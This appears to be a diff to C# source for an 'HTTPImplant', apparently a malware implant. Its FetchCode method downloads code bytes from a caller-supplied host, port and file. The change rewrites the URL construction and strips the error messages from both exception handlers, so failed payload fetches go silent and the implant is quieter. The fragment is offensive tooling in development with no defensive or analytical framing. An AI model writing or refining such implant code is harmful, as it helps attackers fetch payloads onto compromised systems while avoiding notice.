@@ -8,8 +8,8 @@ namespace HTTPImplant.Modules
     {
         public static async Task<byte[]> FetchCode(string hostname, string port, string file)
         {
-            string url = $"http://{hostname}:{port}/{file}";
-            Console.WriteLine($"URL: {url}");
+            string url = "http://" + hostname + ":" + port + "/" + file;
+            Console.WriteLine("URL: " + url);
 
             try
             {
@@ -21,11 +21,9 @@ namespace HTTPImplant.Modules
             }
             catch (WebException webException)
             {
-                Console.WriteLine($"Web request failed: {webException.Message}");
             }
             catch (Exception ex)
-            { 
-                Console.WriteLine($"An unknown error occurred: {ex.Message}");
+            {
             }
             return null;
         }
